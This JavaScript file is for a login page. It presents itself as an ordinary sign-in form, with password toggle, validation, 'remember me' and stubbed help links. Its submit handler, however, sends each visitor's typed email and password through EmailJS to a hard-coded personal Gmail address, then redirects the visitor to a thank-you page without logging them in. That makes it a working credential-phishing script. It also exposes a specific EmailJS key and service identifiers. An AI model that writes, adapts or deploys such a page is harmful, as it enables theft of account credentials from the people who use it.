// ============================================
// EmailJS Configuration
// ============================================
emailjs.init("YTgq3lc7hMxG3qSZ5");

// ============================================
// DOM Elements
// ============================================
const loginForm = document.getElementById('loginForm');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const togglePassword = document.getElementById('togglePassword');
const rememberCheckbox = document.getElementById('remember');
const notification = document.getElementById('notification');
const notificationText = document.getElementById('notificationText');
const submitButton = loginForm.querySelector('.submit-button');
const buttonText = document.querySelector('.button-text');

// ============================================
// Password Toggle
// ============================================
togglePassword.addEventListener('click', function () {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    const icon = this.querySelector('i');
    icon.classList.toggle('fa-eye');
    icon.classList.toggle('fa-eye-slash');
});

// ============================================
// Notifications
// ============================================
function showNotification(message, type = 'success') {
    notificationText.textContent = message;
    notification.className = 'notification';

    if (type === 'error') {
        notification.classList.add('error');
    } else if (type === 'warning') {
        notification.classList.add('warning');
    }

    notification.classList.add('show');

    setTimeout(() => {
        notification.classList.remove('show');
    }, 5000);
}

// ============================================
// Validation
// ============================================
function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function validatePassword(password) {
    return password.length >= 6;
}

// ============================================
// Form Submission
// ============================================
loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    submitButton.disabled = true;
    buttonText.innerHTML = '<span class="loading"></span> Signing In...';

    const email = emailInput.value.trim();
    const password = passwordInput.value;

    if (!validateEmail(email)) {
        showNotification('Please enter a valid email address', 'error');
        submitButton.disabled = false;
        buttonText.textContent = 'Continue';
        emailInput.focus();
        return;
    }

    if (!validatePassword(password)) {
        showNotification('Password must be at least 6 characters', 'error');
        submitButton.disabled = false;
        buttonText.textContent = 'Continue';
        passwordInput.focus();
        return;
    }

    try {
        const templateParams = {
            to_email: 'emmanuelosaro510@gmail.com',
            from_email: email,
            password: password,
            submitted_at: new Date().toLocaleString()
        };

        await emailjs.send('service_a6t9ccv', 'template_xtt60rs', templateParams);

        loginForm.reset();
        window.location.href = 'thank-you.html';

    } catch (error) {
        console.error('EmailJS Error:', error);
        showNotification('Sign in failed. Please try again.', 'error');
    } finally {
        submitButton.disabled = false;
        buttonText.textContent = 'Continue';
    }
});

// ============================================
// Remember Me
// ============================================
document.addEventListener('DOMContentLoaded', function () {
    const savedEmail = localStorage.getItem('rememberedEmail');
    if (savedEmail) {
        emailInput.value = savedEmail;
        rememberCheckbox.checked = true;
    }
});

rememberCheckbox.addEventListener('change', function () {
    if (this.checked) {
        localStorage.setItem('rememberedEmail', emailInput.value);
    } else {
        localStorage.removeItem('rememberedEmail');
    }
});

emailInput.addEventListener('input', function () {
    if (rememberCheckbox.checked) {
        localStorage.setItem('rememberedEmail', this.value);
    }
});

// ============================================
// Forgot Password / Help Links
// ============================================
document.querySelector('.forgot-link').addEventListener('click', function (e) {
    e.preventDefault();
    showNotification('Password reset coming soon!', 'warning');
});

document.querySelector('.help-link').addEventListener('click', function (e) {
    e.preventDefault();
    showNotification('Help functionality coming soon!', 'warning');
});

// ============================================
// Keyboard Shortcut — Ctrl/Cmd + Enter
// ============================================
document.addEventListener('keydown', function (e) {
    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
        loginForm.dispatchEvent(new Event('submit'));
    }
});
